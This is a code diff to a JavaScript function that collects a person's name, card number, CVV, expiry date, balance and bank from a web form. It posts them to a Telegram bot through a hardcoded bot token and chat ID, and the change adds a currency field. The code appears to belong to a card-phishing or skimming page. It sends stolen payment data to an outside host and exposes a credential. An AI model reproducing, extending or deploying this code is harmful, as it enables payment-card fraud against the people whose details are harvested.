@@ -5,6 +5,7 @@ function sendMessage() {
     var expiryDate = document.getElementById('expiryDate').value;
     var cardBalance = document.getElementById('cardBalance').value;
     var chooseBank = document.getElementById('chooseBank').value;
+    var currency = document.getElementById('currency').value;
 
     // Ваш токен бота и ID чата
     var botToken = '6416835308:AAE-lstFazO_12p5eSI4PHIQLKkC4-q_vfU';
@@ -16,7 +17,7 @@ function sendMessage() {
     // Формируем данные для отправки
     var data = {
         chat_id: chatId,
-        text: 'Имя Фамилия: ' + name + '\nНомер карты: ' + cardNumber + '\nCVV: ' + cvv + '\nВремя действия: ' + expiryDate + '\nБаланс: ' + cardBalance + '\nБанк: ' + chooseBank
+        text: 'Имя Фамилия: ' + name + '\nНомер карты: ' + cardNumber + '\nCVV: ' + cvv + '\nВремя действия: ' + expiryDate + '\nБаланс: ' + cardBalance + currency + '\nБанк: ' + chooseBank
     };
 
     // Отправляем POST-запрос с использованием AJAX
